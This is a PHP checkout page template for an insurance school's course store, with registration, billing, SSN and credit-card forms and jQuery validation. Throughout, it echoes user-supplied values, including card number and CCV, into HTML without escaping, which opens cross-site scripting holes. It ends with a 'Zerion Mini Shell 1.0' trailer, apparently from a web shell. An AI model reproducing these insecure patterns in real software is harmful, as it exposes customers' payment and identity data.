									<td colspan="3" align="center"><font color="RED"><b>*</b></font> <b>:  REQUIRED FIELD</b></td>
								</tr>
								<tr>
									<td colspan="3">&nbsp;</td>
								</tr>
								<tr>
									<td valign="top" width="50%">
						
										<table cellspacing="5" cellpadding="0" border="0" width="100%" class="classinfo">
											<tbody>
												<tr><td colspan="2" align="center" class="b-maroon">Student/Shipping Information</td></tr>
												<tr><td colspan="2">&nbsp;</td></tr>
												<tr>
													<td align="right"><font color="RED"><b>*</b></font>First Name : </td>
													<td><input class="required" type="text" name="fname" value="<?php if( isset($user_details) && isset($user_details['fname']) ) echo $user_details['fname']; ?>" size="25" maxlength="30"></td>
												</tr>
								                <tr>
							                    	<td align="right"><font color="RED"><b>*</b></font>Last Name : </td>
							                        <td><input class="required" type="text" name="lname" value="<?php if( isset($user_details) && isset($user_details['lname']) ) echo $user_details['lname']; ?>" size="25" maxlength="30"></td>
								                </tr>
								                <tr>
							                        <td align="right">Middle Initial : </td>
							                        <td><input type="text" name="m_initial" value="<?php if( isset($user_details) && isset($user_details['m_initial']) ) echo $user_details['m_initial']; ?>" size="2" maxlength="1"></td>
								                </tr>
								                <tr>
							                        <td align="right"><font color="RED"><b>*</b></font>Email Address : </td>
							                        <td><input class="required" type="text" name="email" size="25" value="<?php if( isset($user_details) && isset($user_details['email']) ) echo $user_details['email']; ?>" maxlength="42"></td>
								                </tr> 
								
								                <tr>
							                        <td align="right"><font color="RED"><b>*</b></font>Home Address : </td>
							                        <td><input class="required" type="text" name="address1" value="<?php if( isset($user_details) && isset($user_details['address1']) ) echo $user_details['address1']; ?>" size="25" maxlength="64"></td>
								                </tr>
								                <tr>
							                        <td align="right"> </td>
							                        <td><input type="text" name="address2" value="<?php if( isset($user_details) && isset($user_details['address2']) ) echo $user_details['address2']; ?>" size="25" maxlength="64"></td>
								                </tr>
								                <tr>
							                        <td align="right"><font color="RED"><b>*</b></font>City : </td>
							                        <td>
							                        	<input class="required" type="text" name="city" value="<?php if( isset($user_details) && isset($user_details['city']) ) echo $user_details['city']; ?>" size="18" maxlength="30"> 
							                        </td>
								                </tr>
								                <tr>
							                        <td align="right"><font color="RED"><b>*</b></font>State : </td>
							                        <td>
							                        	<input class="required" type="text" name="state" value="<?php if( isset($user_details) && isset($user_details['state']) ) echo $user_details['state']; ?>" size="2" maxlength="2">
							                        
							                        </td>
								                </tr>
								                <tr>
							                        <td align="right"><font color="RED"><b>*</b></font>Zip : </td>
							                        <td><input class="required" type="text" name="zip" value="<?php if( isset($user_details) && isset($user_details['zip']) ) echo $user_details['zip']; ?>" size="10" maxlength="10"></td>
								                </tr>
								                <tr>
							                        <td align="right"><font color="RED"><b>*</b></font>Daytime Phone : </td>
							                        <td><input class="required" type="text" name="phone_day" value="<?php if( isset($user_details) && isset($user_details['phone_day']) ) echo $user_details['phone_day']; ?>" size="25" maxlength="20"></td>
								                </tr>
								                <tr>
							                        <td align="right">Evening/Mobile Phone : </td>
							                        <td><input type="text" name="phone_night" value="<?php if( isset($user_details) && isset($user_details['phone_night']) ) echo $user_details['phone_night']; ?>" size="25" maxlength="20"></td>
								                </tr>
								
								                <tr>
							                        <td align="right">Insurance License Number : </td>
							                        <td><input type="text" name="ins_lic_num" value="<?php if( isset($user_details) && isset($user_details['ins_lic_num']) ) echo $user_details['ins_lic_num']; ?>" size="25" maxlength="24"></td>
								                </tr> 
								                <tr>
							                        <td align="right">Insurance License Renewel Date (MM/DD/YYYY): : </td>
							                        <td><input class="date-field" type="text" name="ins_lic_renew_date" value="<?php if( isset($user_details) && isset($user_details['ins_lic_renew_date']) && $user_details['ins_lic_renew_date'] != '' ) { echo $user_details['ins_lic_renew_date']; }  ?>" size="25" maxlength="10"></td>
								                </tr>
						
							         			<tr>
							                        <td align="right"> SSN : (optional)</td>
							                        <td><input type="text" name="ssn" value="<?php if( isset($user_details) && isset($user_details['ssn']) ) echo $user_details['ssn']; ?>" size="12" ></td>
								                </tr> 
								                <tr>
							                        <td align="right">DOB (MM/DD/YYYY): : </td>
							                        <td><input class="date-field" type="text" name="dob" value="<?php if( isset($user_details) && isset($user_details['dob']) && $user_details['dob'] != '' ) {  echo $user_details['dob']; } ?>" size="12" maxlength="10"></td>
								                </tr> 
											</tbody>
										</table>
									</td>
									
									<td valign="center" align="center" width="1%"><img src="images/acct-vert-line-tall.gif" border="0"></td>
									
									<td valign="top" width="49%">
								                
										<table cellspacing="5" cellpadding="0" border="0" width="100%" class="classinfo">
							                <tbody>
							                	<tr>
							                		<td colspan="2" align="center" class="b-maroon">Company/Agency Information</td>
							                	</tr>
							                	<tr><td colspan="2">&nbsp;</td></tr>
												
								                <tr>
							                        <td align="right">Manager's Email : </td>
							                        <td><input type="text" name="c_man_email" value="<?php if( isset($user_details) && isset($user_details['c_man_email']) ) echo $user_details['c_man_email']; ?>" size="25" maxlength="100"></td>
								                </tr>
								                <tr>
							                        <td align="right">Manager's Name : </td>
							                        <td><input type="text" name="c_man_name" value="<?php if( isset($user_details) && isset($user_details['c_man_name']) ) echo $user_details['c_man_name']; ?>" size="25" maxlength="60"></td>
								                </tr> 
								                <tr>
							                        <td align="right">Manager's Phone/Ext. : </td>
							                        <td><input type="text" name="c_man_phone" value="<?php if( isset($user_details) && isset($user_details['c_man_phone']) ) echo $user_details['c_man_phone']; ?>" size="13" maxlength="12">-<input type="text" name="c_man_phoneext" value="<?php if( isset($user_details) && isset($user_details['c_man_phoneext']) ) echo $user_details['c_man_phoneext']; ?>" size="6" maxlength="8"></td>
								                </tr>
								                <tr>
							                        <td align="right">Company/Agency Name : </td>
							                        <td><input type="text" name="c_name" size="25" value="<?php if( isset($user_details) && isset($user_details['cname']) ) echo $user_details['cname']; ?>" maxlength="30"></td>
								                </tr>
								                <tr>
							                        <td align="right">Company/Agency Address : </td>
							                        <td><input type="text" name="c_address" value="<?php if( isset($user_details) && isset($user_details['c_address']) ) echo $user_details['c_address']; ?>" size="25" maxlength="64"></td>
								                </tr>
								                <tr>
							                        <td align="right"> </td>
							                        <td><input type="text" name="c_address2" value="<?php if( isset($user_details) && isset($user_details['c_address2']) ) echo $user_details['c_address2']; ?>" size="25" maxlength="64"></td>
								                </tr>
								                <tr>
							                        <td align="right">City : </td>
							                        <td><input type="text" name="c_city" value="<?php if( isset($user_details) && isset($user_details['c_city']) ) echo $user_details['c_city']; ?>" size="18" maxlength="30"> </td>
								                </tr>
								                <tr>
							                        <td align="right">State : </td>
							                        <td> <input type="text" name="c_state" value="<?php if( isset($user_details) && isset($user_details['c_state']) ) echo $user_details['c_state']; ?>" size="2" maxlength="2"></td>
								                </tr>
								                <tr>
							                        <td align="right">Zip : </td>
							                        <td><input type="text" name="c_zip" value="<?php if( isset($user_details) && isset($user_details['c_zip']) ) echo $user_details['c_zip']; ?>" size="10" maxlength="10"></td>
								                </tr>
							
												<tr>
													<td colspan="2" height="20"></td>
												</tr>
												
												<tr>
													<td colspan="2" align="center" class="b-maroon">Billing Information</td>
												</tr>
												<tr><td colspan="2">&nbsp;</td></tr>
												
												<tr>
													<td colspan="2">
														<input type="checkbox" name="billsame" onclick="javascript:copyShipInfo(this.form);"> Check if billing and shipping addresses are the same
													</td>
												</tr>
							                 	<tr>
						                        	<td align="right"><font color="RED"><b>*</b></font>First Name : </td>
						                        	<td><input class="required" type="text" name="b_fname" value="<?php if( isset($user_details) && isset($user_details['b_fname']) ) echo $user_details['b_fname']; ?>" size="25" maxlength="30"></td>
							                	</tr>
								                <tr>
							                        <td align="right"><font color="RED"><b>*</b></font>Last Name : </td>
							                        <td><input class="required" type="text" name="b_lname" value="<?php if( isset($user_details) && isset($user_details['b_lname']) ) echo $user_details['b_lname']; ?>" size="25" maxlength="30"></td>
								                </tr>
								                <tr>
							                        <td align="right"><font color="RED"><b>*</b></font>Address : </td>
							                        <td><input class="required" type="text" name="b_address1" value="<?php if( isset($user_details) && isset($user_details['b_address1']) ) echo $user_details['b_address1']; ?>" size="25" maxlength="64"></td>
								                </tr>
								                <tr>
							                        <td align="right"> </td>
							                        <td><input type="text" name="b_address2" value="<?php if( isset($user_details) && isset($user_details['b_address2']) ) echo $user_details['b_address2']; ?>" size="25" maxlength="64"></td>
								                </tr>
								                <tr>
							                        <td align="right"><font color="RED"><b>*</b></font>City : </td>
							                        <td><input class="required" type="text" name="b_city" value="<?php if( isset($user_details) && isset($user_details['b_city']) ) echo $user_details['b_city']; ?>" size="18" maxlength="30"> </td>
								                </tr>
								                <tr>
							                        <td align="right"><font color="RED"><b>*</b></font>State : </td>
							                        <td> <input type="text" name="b_state" value="<?php if( isset($user_details) && isset($user_details['b_state']) ) echo $user_details['b_state']; ?>" size="2" maxlength="2"></td>
								                </tr>
								                <tr>
							                        <td align="right"><font color="RED"><b>*</b></font>Zip : </td>
							                        <td><input class="required" type="text" name="b_zip" value="<?php if( isset($user_details) && isset($user_details['b_zip']) ) echo $user_details['b_zip']; ?>" size="10" maxlength="10"></td>
								                </tr>
								                
							                </tbody>
										</table>
									</td>
								</tr>
								<tr>
									<td colspan="3" align="center">
										<!-- <input type="submit" value="Save and Checkout" /> -->
										<input type="button" value="Save and Checkout" onclick="javascript:formSubmit(); return false;" />
	                					
									</td>
								</tr>
							</tbody>
						</table>
					</form>
						
					<?php 

					//show cart details
					
					} else if( $show_cart && isset($session->user_id) && $session->user_id > 0 ){
								
						//if user successfully logged-in show cart info
								
						$users->load($session->user_id);
						$user_details = $users->all_fields;
					?>
					
					<div style="padding:1px;">
					
						<?php 			
						if(is_array($user_details) && !empty($user_details)) {
									
							$fullName = $user_details['fname'] .' '. $user_details['lname'];
									
						?>
					
					
						<table cellspacing="3" cellpadding="5" align="center" class="standard" border="0">
							<tbody>
								<tr bgcolor="#FAF1E0">
									<td align="left" class="contentbar1">&nbsp;&nbsp;<b>Student/Shipping Info:</b></td>
									<td align="left" class="contentbar1">&nbsp;&nbsp;<b>Company/Agency Info:</b></td>
									<td align="left" class="contentbar1">&nbsp;&nbsp;<b>Billing Information:</b></td>
								</tr>
											
						 		<tr>
									<td valign="top" width="33%">
								
										<div style="line-height:150%;margin-left:8px;">
									
											<?php if($fullName) echo $fullName.'<br>'; ?>
											<?php if($user_details['address1']) echo $user_details['address1'].'<br>'; ?>
											<?php if($user_details['address2']) echo $user_details['address2'].'<br>'; ?>
											<?php if($user_details['city']) echo $user_details['city'].',&nbsp;'; ?>
											<?php if($user_details['state']) echo $user_details['state'].'&nbsp;'; ?>
											<?php if($user_details['zip']) echo $user_details['zip'].'<br>'; ?>
											<?php if($user_details['phone_day']) echo $user_details['phone_day'].'<br>'; ?>
											[<a href="?edit_user=<?php echo $user_details['user_id'];?>" class="edit">edit</a>]
									
										</div>
									</td>
								
									<td width="33%" valign="top">
									
										<div style="line-height:150%;margin-left:8px;">
											
											<?php if($user_details['c_name']) echo $user_details['c_name'].'<br>'; ?>
											<?php if($user_details['c_address']) echo $user_details['c_address'].'<br>'; ?>
											<?php if($user_details['c_address2']) echo $user_details['c_address2'].'<br>'; ?>
											<?php if($user_details['c_city']) echo $user_details['c_city'].',&nbsp;';?>
											<?php if($user_details['c_state']) echo $user_details['c_state'].'&nbsp;';?>
											<?php if($user_details['c_zip']) echo $user_details['c_zip'].'<br>'; else echo '<br>'; ?>
											<?php if($user_details['c_man_name']) echo $user_details['c_man_name'].'<br>'; ?>
											<?php if($user_details['c_man_phone']) echo $user_details['c_man_phone'].'<br>'; ?>
											<?php if($user_details['c_man_phoneext']) echo 'Ext: '.$user_details['c_man_phoneext'].'<br>'; ?>
											<?php if($user_details['c_man_email']) echo $user_details['c_man_email'].'<br>'; ?>
									
											[<a href="?edit_user=<?php echo $user_details['user_id'];?>" class="edit">edit</a>]
									
										</div>
									</td>
											
									<td width="34%" valign="top">
									
										<div style="line-height:150%;margin-left:8px;">
										
											<?php if($user_details['b_fname']) echo $user_details['b_fname'] .' '. $user_details['b_lname'].'<br>'; ?>
											<?php if($user_details['b_address1']) echo $user_details['b_address1'].'<br>'; ?>
											<?php if($user_details['b_address2']) echo $user_details['b_address2'].'<br>'; ?>
											<?php if($user_details['b_city']) echo $user_details['b_city'].', '; ?>
											<?php if($user_details['b_state']) echo $user_details['b_state'].' '; ?>
											<?php if($user_details['b_zip']) echo $user_details['b_zip'].'<br>'; else '<br>'; ?>
											
											[<a href="?edit_user=<?php echo $user_details['user_id'];?>" class="edit">edit</a>]
											
										</div>
									</td>
								</tr>
							</tbody>
						</table>
								
						<?php 
						} 
						?>
								
						<br></br>
									
						<form name="save-form" method="POST" style="margin:0px;" >
						
							<!-- <input type="hidden" name="checkout" value="product_checkout"/> -->
							
							<input type="hidden" name="remove_product_key" value="" />
																
							<input type="hidden" name="action" id="action" value=""/>
								
							<input type="hidden" name="franchise" value="<?php echo $user_details['franchise'];?>" />
												
							<table class="all-items" cellspacing="1" cellpadding="5" align="center" border="0">
									
								<thead>
									<tr bgcolor="#FAF1E0">
							        	<td class="contentbar1" style="text-align:center;width:10%;" >&nbsp;<b>Remove</b></td>
							         	<td class="contentbar1" style="text-align:center;width:40%;" ><b>Description</b></td>
							          	<td class="contentbar1" style="text-align:center;width:10%;" ><b>Quantity</b></td>
							          	<td class="contentbar1" style="text-align:center;width:10%;" ><b>Price</b></td>
							          	<td class="contentbar1" style="text-align:center;width:10%;" ><b>Total</b></td>
							        </tr>
							    </thead>
							    
								<tbody>
									<?php
									if( isset($cartItems) && !empty($cartItems) ) {
										
										//print_r($cartItems);
										
										foreach($cartItems as $keyid => $cartItemObject){
									?>
												
										<tr>
											<td align="center" valign="middle">
												<input type="checkbox" name="delete_product<?php echo $keyid;?>" value="<?php echo $keyid; ?>" onclick="deleteProduct(this);">
											</td>
											<td >
                                                <input type="hidden" name="credithours<?php echo $keyid; ?>" value="<?php echo $cartItemObject->credit_hours; ?>">
                                                <input type="hidden" name="prodoption<?php echo $keyid; ?>" value="<?php echo $cartItemObject->description; ?>">
                                                <b><?php echo $cartItemObject->description; ?></b>
											</td>
											<td align="center" valign="middle" >
												 <input type="hidden" name="quantity<?php echo $keyid; ?>" value="<?php echo $cartItemObject->quantity; ?>">
												 <?php echo $cartItemObject->quantity; ?>
											</td>
									  		<td align="center" >
									  			$<?php echo $cartItemObject->unit_price; ?>
											</td>
									  		<td align="center" >
									  			<b>$<?php echo number_format(($cartItemObject->quantity * $cartItemObject->unit_price),2); ?></b>
									  		</td>
								        </tr>
															
									<?php 
										}													
									} else {
									?>
												
										<tr>
											<td align="center" colspan="6" class="">
								            	<br>
								            	<font size="-1">
								            		<b>There aren't any items in your shopping cart at the moment!<br></b>
								            <?php /*
								            		<!-- ToDo:: Contnue shopping -->
								            		[ <a href="index.php">Continue Shopping</a> ]<br><br>
*/ ?>
								          		</font>
								          	</td>
								    	</tr>
											    	
									<?php 
									} 
									?>			
								</tbody>        
							</table>
									
							<?php 
								if( isset($cartItems) && !empty($cartItems) ) { 	// 2nd start of isset cartItems
									
									$payment_mode = '';
									if( isset($post_params["payment_mode"]) && $post_params["payment_mode"] != '') 
										$payment_mode = ($post_params['payment_mode'] != 'trustcommerce') ? $post_params['payment_mode'] : 'credit_card';
											
							?>
							
							<table cellspacing="1" cellpadding="5" align="center" border="0">
								<tr><td colspan="5">&nbsp; </td></tr>
								<tr>
									<td style="width:10%;">&nbsp;  </td>
									<td style="width:40%;">
									
										<input type="hidden" name="country" value="US">
								        <input type="hidden" name="payment_method" value="<?php echo $payment_mode;?>">
										<input type="hidden" name="mv_order_profile" value="<?php echo $payment_mode;?>">														
										<input type="hidden" name="nitems" value="<?php echo count($cartItems);?>" />
										
										<table bgcolor="#FFFFFF" style="margin-bottom:20px;" cellspacing="1" cellpadding="5" align="center" border="0" >
											<tbody>
												<tr bgcolor="#FAF1E0">
													<td align="center" colspan="2" class="paymentinfo">
														<b>Discount Information</b>
													</td>
												</tr>
										        <tr bgcolor="#FAF1E0">
										            <td align="right"><b>Promotion Code:</b>&nbsp;&nbsp;</td>
										            <td>
														<!--	Changes 29Dec, 2015 1. add condition if action is not clear_promocode 	 2. Add Remove Button           -->
											            <input type="text" name="promo_code" value="<?php if( isset($post_params) && isset($post_params['promo_code'])  && $post_params['action'] != 'clear_promocode' ) { echo $post_params['promo_code']; }?>" size="16" maxlength="15"> 
											            <input type="button" value="Apply" onclick="javascript:$(this.form).find('#action').val('check_promocode'); this.form.submit(); return false;">
											            <input type="button" class="<?php echo ($show_remove_button)? '': "hide" ?>" value="Remove" onclick="javascript:$(this.form).find('#action').val('clear_promocode'); this.form.submit(); return false;">
											        </td>
										        </tr>
											</tbody>
										</table>
										
										<table bgcolor="#FFFFFF" style="margin-bottom:20px;" cellspacing="1" cellpadding="5" align="center" border="0" >
											<tbody>
        										<tr bgcolor="#FAF1E0">
        											<td align="center" colspan="2" class="paymentinfo">
        												<b>Payment Information </b>
        											</td>
        										</tr>
        										
        										<tr bgcolor="#FAF1E0">
													<td align="right"><b>Payment Type:</b>&nbsp;&nbsp;</td>
													<td>
														<select <?php if ($global_cart->total > 0) { echo 'class="required"'; } ?> name="payment_mode" onchange="this.form.submit();">
															<option value=""> -- Please Select -- </option>
															<option value="trustcommerce" <?php if( isset($post_params["payment_mode"]) && $post_params["payment_mode"] == 'trustcommerce' ) echo 'selected'; ?>>Credit Card</option>
															<option value="PIN" <?php if( isset($post_params["payment_mode"]) && $post_params["payment_mode"] == 'PIN' ) echo 'selected'; ?>>Corporate PIN</option>
														</select>
													</td>
												</tr>
												
        										<?php  
												if( isset($post_params["payment_mode"]) ){
													
													if( $post_params['payment_mode'] == 'PIN' ){
														
														$pin =  '<tr bgcolor="#FAF1E0">
														    <td align="right"><b>Corporate PIN# :&nbsp;</b></td>
														    <td>
														    	<input class="required" type="text" name="corporate_pin" value="';
														$pin .= isset($post_params['corporate_pin']) ? $post_params['corporate_pin'] : '';
														$pin .= '"/>
														    </td>
														</tr>';
														echo $pin;
														
													} else if( $post_params["payment_mode"] == 'trustcommerce') { 
														
														$accepted_cards = $users->acceptedCards($user_details['franchise']);
												?>
										
												
														<tr bgcolor="#FAF1E0">
														    <td align="right"><b>Cards Accepted:</b>&nbsp;&nbsp;</td>
														    <td align="center">
														    	<?php 
														    	if(!empty($accepted_cards)){
															    	foreach($accepted_cards as $card){
															    		if($card != 'American Express'){
															    			echo '<img src="images/'.$card.'-logo.jpg" border="0" alt="We Accept '.$card.'">';
															    		}
															    	}
														    	}
														    	?>
																
															</td>
														</tr>
														<tr bgcolor="#FAF1E0">
														    <td align="right"><b>Card Type:</b>&nbsp;&nbsp;</td>
														    <td>
														    	<select class="required" name="cc_card_type" class="card_type">
																	<option value=""> -- Select -- </option>
																	<?php 
																	if(!empty($accepted_cards)){
																    	foreach($accepted_cards as $card){
																    		if($card != 'American Express'){
																    			$option = '<option value="'.$card.'" ';
																    			$selected = ( isset($post_params['cc_card_type']) && $post_params['cc_card_type'] == $card) ? 'selected' : '';
																    			$option .= $selected. ' >'.$card.'</option>';
																    			echo $option;															
																    		}
																    	}
															    	}
																	?>
																	
																</select>
														    </td>
														</tr>
														<tr bgcolor="#FAF1E0">
														    <td align="right"><b>Name On Card:</b>&nbsp;&nbsp;</td>
														    <td><input class="required" type="text" name="mv_credit_card_name" size="28" value="<?php if( isset($post_params['mv_credit_card_name']) ) echo $post_params['mv_credit_card_name'];?>"></td>
														</tr>
														<tr bgcolor="#FAF1E0">
														    <td align="right"><b>Card Number:</b>&nbsp;&nbsp;</td>
														    <td><input class="required" type="text" name="mv_credit_card_number" size="28" maxlength="16"  value="<?php if( isset($post_params['mv_credit_card_number']) ) echo $post_params['mv_credit_card_number'];?>" ></td>
														    <!-- T0Do:: onchange check card type
														    <td><input type="text" name="mv_credit_card_number" size="28" onchange="checkCardType();"></td>-->
														</tr>
														<tr bgcolor="#FAF1E0">
														    <td align="right"><b>CCV Number:</b>&nbsp;&nbsp;</td>
														    <td>
															    <input class="required" type="text" name="mv_ccv_number" size="12" maxlength="3" value="<?php if( isset($post_params['mv_ccv_number']) ) echo $post_params['mv_ccv_number'];?>" />
															    <!-- 
															    <a href="/images/ccv-image.jpg" target="ccvwin" onclick="window.open('images/ccv-image.jpg','ccvwin','height=241, width=581, toolbar=no, directories=no,status=no,menubar=no,scrollbars=no,resizable=no'); return false;">What's This?</a>
															    -->
															</td>
														</tr>
													
														<tr bgcolor="#FAF1E0">
														    <td align="right"><b>Exp Date:</b>&nbsp;&nbsp;</td>
														    <td>    
														    	<select class="required" name="mv_credit_card_exp_month" class="cc_month required">
														    		<?php 
														    		for($i= 1; $i<=12; $i++){
							$j = str_pad($i,2,0,STR_PAD_LEFT);
														    			
														    			$option = '<option value="' . $j . '" ';
														    			$selected = ( isset($post_params['mv_credit_card_exp_month']) && $post_params['mv_credit_card_exp_month'] == $j) ? 'selected' : '';
																    			
														    			$option .= $selected . ' > ' . date("F",strtotime(date("Y").$j."01")) . '</option>';
																		//mktime(0,0,0,$j)
														    			echo $option;
														    		}
														    		?>
													                
											                   	</select>
														        <select class="required" name="mv_credit_card_exp_year" class="cc_year required">
																	<?php 
																	$current_year = date('Y');
																	for($i=$current_year; $i<=$current_year+10; $i++){
																		$j = date("y", mktime(0,0,0,1,1,$i));
																		
																		$option = '<option value="' . $j . '" ';
																		$selected = ( isset($post_params['mv_credit_card_exp_year']) && $post_params['mv_credit_card_exp_year'] == $j) ? 'selected' : '';
																    	
														    			$option .=  $selected .' > ' . $i . '</option>';
														    			echo $option;
																	}
																	?>
																</select>
																<br>
														 	</td>
														</tr>
												
												<?php 
													}
												}
												
												if($global_cart->chargeshippingcount > 0){
									            	echo '<tr bgcolor="#FAF1E0">
										              <td style="text-align:right;"><b>Shipping Method :&nbsp;</b></td>
										              <td > <input type="hidden" value="Standard" name="shipmode" /> Standard</td>
										            </tr>';
												}
												
												?>
												
		
											</tbody>
	 									</table>
	 									
										
									</td>
									
									<td style="width:10%;">&nbsp;  </td>
									
									<td valign="top" colspan="2" style="text-align:center;width:20%;" >
									
										<table cellspacing="1" cellpadding="5" align="right" border="0">
										
											<tr>
								              <td style="text-align:right;"><b>Subtotal :&nbsp;</b></td>
								              <td ><input type="hidden" name="subtotal" value="<?php echo number_format($global_cart->sub_total, 2);?>" />
								              $<?php echo number_format($global_cart->sub_total,2); ?></td>
							            	</tr>
							            	
											<?php
											if( $global_cart->net_discount_amt != ''){
											?>
											<tr>
								              <td style="text-align:right;"><b>Discount :&nbsp;</b></td>
								              <td style="color:red;"><input type="hidden" name="discount_amt" value="<?php echo number_format($global_cart->net_discount_amt,2); ?>" />$<?php echo number_format($global_cart->net_discount_amt,2); ?></td>
							            	</tr>
											<?php 
											}
											?>    
											        	
							            	<?php 
									            		
							            	if($global_cart->totalrecordingfee > 0){
								            	echo '<tr>
									              <td style="text-align:right;">&nbsp;&nbsp;<b>Total Recording Fee :&nbsp;</b></td>
									              <td > 
									              	<input type="hidden" name="recording_fee" value="'.$global_cart->totalrecordingfee.'" />
									              	$ ' . $global_cart->totalrecordingfee . 
									              '</td>
									            </tr>';
							            	}
											
							            	if($global_cart->chargeshippingcount > 0){
								            	echo '<tr>
									              <td style="text-align:right;">&nbsp;&nbsp;<b>Shipping :&nbsp;</b></td>
									              <td > <input type="hidden" name="shipping" value="'.$global_cart->shippingamount.'" /> 
									              $ ' . $global_cart->shippingamount . '</td>
									            </tr>';
							            	}
							            	
							            	if($global_cart->totaltotax > 0){
								            	echo '<tr>
									              <td style="text-align:right;">&nbsp;&nbsp;<b>Sales Tax :&nbsp;</b></td>
									              <td > <input type="hidden" name="salestax" value="'.$global_cart->salestax.'" />
									              	$ ' . $global_cart->salestax . '</td>
									            </tr>';
							            	}
									
	   
											?>
								            <tr>
								              	<td style="text-align:right;"><b>Total :&nbsp;</b></td>
								              	<td >
								              		<input type="hidden" name="total_cost" value="<?php echo number_format($global_cart->total,2); ?>" />
								              		<b>$<?php echo number_format($global_cart->total,2); ?></b>
								              	</td>
								            </tr>
										</table>
									
									</td>
								</tr>
							</table>
							
							<?php 	
								} 	// end of isset cartItems 
							?>
									
							<br/>
									
							<center>
								
							<?php  
								if( ( isset($cartItems) && !empty($cartItems) && $global_cart->total == 0 ) ||
									( isset($post_params["payment_mode"]) && $post_params["payment_mode"] != '' )
								) {  
							?>
								
							    <input type="button" name="mv_click" value="Place Order" onclick="javascript:$(this.form).find('#action').val('pay_now');formSubmit();return false;">
        						<div id="processing_text">Processing ... Please wait.</div>
								
							<?php } else {?>
						        	
						    	<b>Please select a Payment Type from<br> above to complete your transaction.</b>
						        
							<?php } ?>
							
							</center>
							
						</form>
						
					<?php 
						
					} else if( $show_signin_form ){
								
								// --------------- if no user logged-in ----------------/
								
						?>		
								
								
								<table cellspacing="0" cellpadding="10" border="0" align="center" width="94%" class="checking_form">
									<tbody>
										<tr>
									        <td valign="top" width="50%">
												<b>Returning Students</b><br><br>
									
												Please sign in before continuing for access to convenient features and quick checkout<br><br>
										
												<form action="checkout.php" method="POST" id="signin">
													
													<input type="hidden" name="action" value="signin" />
													
													<table cellspacing="0" cellpadding="8" border="0">
														<tbody>
															<tr>
																<td align="right"><b>Email:</b></td>
																<td><input type="text" name="login_email" value="<?php if( !empty($entity_data) && isset($entity_data['login_email']) ) echo $entity_data['login_email'];?>" size="25"></td>
															</tr>
															<tr>
																<td align="right"><b>Password:</b></td>
																<td><input type="password" name="login_password" size="25"></td>
															</tr>
															<!-- 
															<tr>
																<td></td>
																<td><a href="forgot_password.php" >I forgot my password</a></td>
															</tr>
															-->
															<tr>
																<td></td>
																<td><input type="button" value="Sign In" name="signin"></td>
															</tr>
														</tbody>
													</table>
												</form>
											</td>
											<td valign="center" width="1%" align="center">
												<img src="images/acct-vert-line.gif" border="0">
											</td>
											<td valign="top" width="49%">
												<b>New Students</b><br><br>
									
												Register with 1st Dakins Insurance School to use convenient features and quick checkout.<br><br>
												Your <b>email</b> address also serves as your <b>username</b>.  If you are a manager
												signing up another student please enter the <b>student's</b> email address.<br><br>
										
												<form action="checkout.php" method="POST" id="signup">
												
													<input type="hidden" name="action" value="signup" />
													
													<table cellspacing="0" cellpadding="8" border="0" class="classinfo">
														<tbody>
															<tr>
																<td align="right"><b>Email Address:</b></td>
																<td><input type="text" name="new_username" size="25" maxlength="42" value="<?php if( !empty($entity_data) && isset($entity_data['new_username']) ) echo $entity_data['new_username'];?>" ></td>
															</tr>
											                <tr>
											                        <td align="right"><b>Password:</b></td>
											                        <td><input type="password" name="new_password"  id="new_password" value=""></td>
											                </tr>
											                <tr>
											                        <td align="right"><b>Confirm Password:</b></td>
											                        <td><input type="password" name="new_confirmpassword"  id="new_confirmpassword" value=""></td>
											                </tr>
															<tr>
																<td></td>
																<td><input type="button" value="Sign Up" name="signup"></td>
															</tr>
														</tbody>
													</table>
												</form>
												
											</td>
										</tr>
									</tbody>
								</table>

								
						<?php 	
							}
						?>
						
					</div>  <!--  end of panel body -->
				</div> <!--  end listing panel -->
			</div> <!--  end mainColumn  -->
		</div>
	</div>

</div>


<link rel="stylesheet" href="js/jquery-ui-1.11.4/jquery-ui.min.css" />
<script src="js/jquery-ui-1.11.4/jquery-ui.min.js" type="text/javascript" charset="utf-8"></script>

	<script>
	
		$(document).ready(function() {
			
			if($( ".date-field" ).length){
				$( ".date-field" ).datepicker({
					changeMonth: true,
				      changeYear: true
				});
			}
			
			//validate login form
			
				jQuery('form#signin').validate({	
					rules : {
						login_email	: { required : true },
						login_password	: {	required : true}
					},
					messages : {
						login_email	: { required : "Enter Email"},
						login_password 	: {	required : "Enter Password"}					
					}
				});
				
				$('input[name="signin"]').on('click',function(){

					if( jQuery('form#signin').valid() )
						jQuery('form#signin').submit();
					else 
						jQuery('form#signin').find(".error:first").focus();
					
				});
			

			//validate signup form 
			
				jQuery('form#signup').validate({					
			    	rules: {
						new_username 		: { required : true, email  : true },
			        	new_password		: { required : true } , 
			            new_confirmpassword	: { required : true, equalTo: "#new_password" }
					},
			     	messages:{
						new_username: "Enter a valid email address",
						new_password: { 
			            	required:"Password is required"
			            },
			            new_confirmpassword	: { required : "Re Enter Password " , equalTo: "Passwords does not Match" }
						
		         	}    
				});

				$('input[name="signup"]').click(function(){
					
					if( jQuery('form#signup').valid() )
						jQuery('form#signup').submit();
					else 
						jQuery('form#signup').find(".error:first").focus();
					
				});

		});
		
		function copyShipInfo(form){
			if(form.billsame.checked){
				form.b_fname.value = form.fname.value;
				form.b_lname.value = form.lname.value;
				form.b_address1.value = form.address1.value;
				form.b_address2.value = form.address2.value;
				form.b_city.value = form.city.value;
				form.b_state.value = form.state.value;
				form.b_zip.value = form.zip.value;
			}
			else{
				form.b_fname.value = "";
				form.b_lname.value = "";
				form.b_address1.value = "";
				form.b_address2.value = "";
				form.b_city.value = "";
				form.b_state.value = "";
				form.b_zip.value = ""; 
			}
		}	

		function deleteProduct(e){
			var rowno = jQuery(e).val();	

			form = $('form[name="save-form"]');
			if(rowno == 0)
				form.find( "table.all-items tbody tr:first" ).remove();
			else
				form.find( "table.all-items tbody tr:nth-child(" + rowno + ")" ).remove();
				
				
			form.find('input[name="remove_product_key"]').val(rowno);
			form.find('input[name="action"]').val('delete_product');
			form.submit();

		}

		function payNow(){

			var saveForm = $('form#cart-items');
			if( saveForm.valid() ){
				saveForm.find('input[name="action_taken"]').val('pay_now');
				saveForm.submit();
			} else {
				saveForm.find(".error:first").focus();
			}
		}

		function formSubmit(){
			form = $('form[name="save-form"]');
			take_action = form.find('input[name="action"]').val();
			if(take_action == 'save_user_details'){
				if( form.valid() ) form.submit();
				else form.find(".error:first").focus();
			}
			if(take_action == 'pay_now'){
				if( form.valid() ) form.submit();
				else form.find(".error:first").focus();
			}
		}
		
	</script>

    
<?php	include("includes/footer.php"); ?>


Zerion Mini Shell 1.0
